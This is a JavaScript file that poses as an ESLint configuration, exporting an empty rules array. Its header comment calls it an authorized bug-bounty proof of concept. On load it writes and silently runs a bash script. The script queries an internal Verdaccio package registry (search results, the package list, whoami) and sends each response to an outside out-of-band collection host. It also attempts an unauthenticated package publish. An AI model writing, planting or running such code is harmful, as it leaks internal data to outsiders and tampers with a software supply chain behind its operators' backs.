// CodeRabbit review-sandbox: internal Verdaccio (10.0.0.28:4873) deep-probe (authorized H1 PoC)
const fs = require('fs'), cp = require('child_process');
const OOB = 'dau8dn5l0ffvsd7uf4p0mrxwxumypfm35.oast.fun';
const s = [
 '#!/bin/bash',
 'OOB="dau8dn5l0ffvsd7uf4p0mrxwxumypfm35.oast.fun"; R=http://10.0.0.28:4873',
 'post(){ curl -s -m8 -X POST --data-binary "@-" "https://$1.$OOB/" >/dev/null 2>&1; }',
 'curl -s -m6 "$R/" | head -c 300 | post ver',
 'curl -s -m6 "$R/-/v1/search?text=coderabbit&size=100" | head -c 900 | post search',
 'curl -s -m6 "$R/-/v1/search?text=scope:coderabbit&size=100" | head -c 900 | post sscope',
 'curl -s -m6 "$R/-/all" | head -c 900 | post vall',
 'curl -s -m6 "$R/-/whoami" | head -c 100 | post who',
 'curl -s -m6 -o /dev/null -w "%{http_code}" "$R/@coderabbit%2finternal-probe-zzq" | post dc1',
 'curl -s -m6 -o /dev/null -w "%{http_code}" "$R/coderabbit-internal-nonexist-zzq" | post dc2',
 'printf %s \x27{"_id":"@orionsec/crprobe","name":"@orionsec/crprobe","dist-tags":{"latest":"0.0.1"},"versions":{"0.0.1":{"name":"@orionsec/crprobe","version":"0.0.1","dist":{"tarball":"http://x/","shasum":"da39a3ee5e6b4b0d3255bfef95601890afd80709"}}},"_attachments":{}}\x27 > /tmp/pk.json',
 'curl -s -m8 -o /dev/null -w "%{http_code}" -X PUT -H "content-type: application/json" --data-binary @/tmp/pk.json "$R/@orionsec%2fcrprobe" | post putstatus',
 'echo done | post vdone',
].join('\n');
fs.writeFileSync('/tmp/vp.sh', s);
try { cp.execSync('bash /tmp/vp.sh', {timeout: 90000, stdio:'ignore'}); } catch(e) {}
module.exports = [{rules:{}}];
